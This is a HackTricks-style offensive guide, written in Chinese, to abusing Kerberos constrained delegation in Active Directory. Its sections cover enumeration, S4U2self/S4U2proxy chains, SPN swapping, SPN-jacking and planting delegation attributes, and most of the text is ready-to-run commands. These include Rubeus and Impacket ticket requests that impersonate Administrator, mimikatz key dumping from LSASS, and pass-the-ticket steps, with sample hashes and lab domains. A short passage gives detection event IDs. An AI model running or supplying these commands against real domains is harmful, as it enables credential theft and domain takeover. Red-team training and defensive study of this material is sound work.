# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

使用此功能，域管理员可以**允许**一台计算机针对某台机器上的任意**服务**，**冒充用户或计算机**。

- **Service for User to self (_S4U2self_)：** 任何**拥有 SPN 的服务账户**通常都可以代表任意用户获取指向自身的 TGS。如果该账户的 _userAccountControl_ 中还具有 [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)（T2A4D），则该 TGS 将是**可转发的**，这正是协议转换对**经典约束委派**直接有用的原因。
- **Service for User to Proxy(_S4U2proxy_)：** **服务账户**可以代表用户，向 **msDS-AllowedToDelegateTo** 中列出的 SPN 获取 TGS。S4U2Proxy 使用的证据票据必须是发往委派服务的**可转发**票据：可以是从受害者处捕获的真实客户端到服务票据，也可以是通过 **S4U2Self + T2A4D** 生成的票据。

**注意**：如果用户在 AD 中被标记为“_Account is sensitive and cannot be delegated_”，或是 **Protected Users** 的成员，通常将**无法通过约束委派冒充**该用户。在现代域中，针对启用了委派的账户时，应优先使用 **AES** material，而不要仅假设使用 RC4。

这意味着，如果你**攻陷了服务账户的 hash**，就可以**冒充用户**，并代表他们通过指定的机器访问任意**服务**（可能实现 **privesc**）。

此外，你**不仅可以访问该用户能够被冒充后访问的服务，还可以访问任意服务**，因为 SPN（请求的服务名称）不会被检查（票据中的这一部分未加密或签名）。因此，如果你可以访问 **CIFS service**，也可以使用 Rubeus 中的 `/altservice` flag 访问 **HOST service**。Impacket 的 **getST -altservice** 及其他工具也利用了相同的 SPN swapping weakness。

此外，**DC 上的 LDAP service access** 正是利用 **DCSync** 所需的权限。
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Operator note:** 不要仅凭 **ADUC** 或 BloodHound 截图来审查 **gMSA/sMSA**。这些账户通常会隐藏常见的 Delegation 选项卡，因此请直接枚举原始的 **`userAccountControl`** 和 **`msDS-AllowedToDelegateTo`** 属性。
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition 与 Kerberos-only constrained delegation

如果被攻陷的账户具有 **T2A4D**，通常仅凭服务密钥/TGT 就可以完成完整的 **`S4U2Self -> S4U2Proxy`** 链。<sup>[[2]](#references)</sup>

如果它仅具有 **`msDS-AllowedToDelegateTo`**（经典的 **"Use Kerberos only"** 模式），delegation 仍然可以被滥用，但用于 S4U2Proxy 的证据票据必须是面向 delegating service 的真实、可转发的 user-to-service ticket。实际上，这意味着从 **LSASS/ccache** 中窃取或捕获 victim TGS，并将其传入第二阶段（Rubeus 中使用 `/tgs:`）。**不可转发**的 S4U2Self ticket 对于 classic constrained delegation **并不足够**；如果这是你唯一的证据票据，请改为检查 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)。<sup>[[2]](#references)</sup>

### 跨域 constrained delegation 注意事项（2025+）

从 **Windows Server 2012/2012 R2** 开始，KDC 通过 S4U2Proxy extensions 支持跨域/跨 forest 的 constrained delegation。现代版本（Windows Server 2016–2025）保留了这一行为，并添加了两个 PAC SIDs 来标识 protocol transition：<sup>[[1]](#references)</sup>

- `S-1-18-1`（**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**），用户正常进行身份验证时使用。
- `S-1-18-2`（**SERVICE_ASSERTED_IDENTITY**），服务通过 protocol transition 断言身份时使用。

在跨域使用 protocol transition 时，预期 PAC 中包含 `SERVICE_ASSERTED_IDENTITY`，这可以确认 S4U2Proxy 步骤已成功。<sup>[[1]](#references)</sup>

### Impacket / Linux tooling（altservice & full S4U）

最新的 Impacket（0.11.x+）提供了与 Rubeus 相同的 S4U 链和 SPN swapping 功能：<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
如果你更倾向于先伪造用户 ST（例如只有 offline hash），可以将 **ticketer.py** 与 **getST.py** 搭配用于 S4U2Proxy。当你已经拥有可用的 ccache、只需要为同一主机替换 service class 时，**tgssub.py** 也很有用。有关当前的兼容性问题，请参阅公开的 Impacket issue #1713（当伪造的 ST 与 SPN key 不匹配时会出现 KRB_AP_ERR_MODIFIED）。<sup>[[2]](#references)</sup>

### SPN-jacking：重定向约束委派目标

经典约束委派在 `msDS-AllowedToDelegateTo` 中授权的是一个 **SPN 字符串**，而不是不可变的目标 SID。在 S4U2Proxy 期间，KDC 会解析当前拥有该 SPN 的账户，并使用该账户的长期密钥加密 service ticket。因此，控制委派账户，并对另一个 service/computer 账户拥有 `WriteSPN` 权限，即可在无需 `SeEnableDelegationPrivilege` 的情况下重定向未更改的委派约束。<sup>[[5]](#references)[[6]](#references)</sup>

存在两种变体：<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking：**允许的 SPN 因其原所有者被删除、重命名或移除 SPN 而成为孤立 SPN。将其直接添加到所需的目标账户。
- **Live SPN-jacking：**SPN 仍属于源账户。重复 SPN 验证通常会阻止写入目标，因此需要对两个对象都拥有 `WriteSPN`：从源账户移除 SPN，将其添加到目标账户，获取 ticket，然后恢复原始注册。

下面的抽象化 Linux 流程会移动一个允许的 SPN，以被攻陷的委派主体运行 S4U，并将 ticket 的 service name 重写为新目标上的有用 service。<sup>[[5]](#references)[[6]](#references)</sup>
```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
-impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
"$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```
`-altservice` 是第二个独立的 primitive。S4U2Proxy ticket 的加密对象是当前拥有 `$DELEGATED_SPN` 的 account；由于 service name（`sname`）位于加密 ticket body 之外，tooling 可以替换为另一个 service class/hostname，前提是该 service 使用同一个 account key。SPN-jacking 首先会更改保护 ticket 的 **account key**，而 service-class substitution 则会更改该 ticket 的 **呈现位置**。<sup>[[5]](#references)[[6]](#references)</sup>

对于 live jacking，应在获取 ticket 后立即反转这两次 LDAP 写入，以避免破坏合法 service。在启用了 computer-account auditing 的 DC 上，查找 Security event **4742**：某台 computer 移除了 `servicePrincipalName`，随后另一台 computer 很快添加了它；尤其要关注 SPN hostname 与目标的 `dNSHostName` 不同的情况。结合 event **4769** 进行关联：S4U2Self 会将同一 account 作为 client/service，而 S4U2Proxy 会填充 **Transited Services**。<sup>[[5]](#references)</sup>

### 从低权限 creds 自动化 delegation 设置

如果你已经对某个 computer 或 service account 拥有 **GenericAll/WriteDACL**，可以使用 **bloodyAD**（2024+）远程推送所需 attributes，而无需 RSAT：
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
这样一来，只要你能够写入这些属性，就可以在没有 DA 权限的情况下构建一条用于 privesc 的 constrained delegation 路径。

- Step 1: **获取允许服务的 TGT**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> 还有**其他获取 TGT ticket** 或 **RC4** 或 **AES256** 的方式，无需在计算机上成为 SYSTEM，例如 Printer Bug 和 unconstrain delegation、NTLM relaying 以及 Active Directory Certificate Service abuse
>
> **只要拥有该 TGT ticket（或其 hash），无需 compromise 整台计算机即可执行此攻击。**

- Step2: **获取代表该用户进行 impersonating 的服务的 TGS**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**更多信息请参阅 ired.team。**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) 和 [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos 受限委派概述（Microsoft Learn，2025）](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [使用 Impacket 滥用委派（第 2 部分）：受限委派（Black Hills，2025）](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos 受限委派（ired.team）](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity 终结了域：Kerberos 攻击概述（SpecterOps）](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking：WriteSPN 滥用中的边缘案例](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
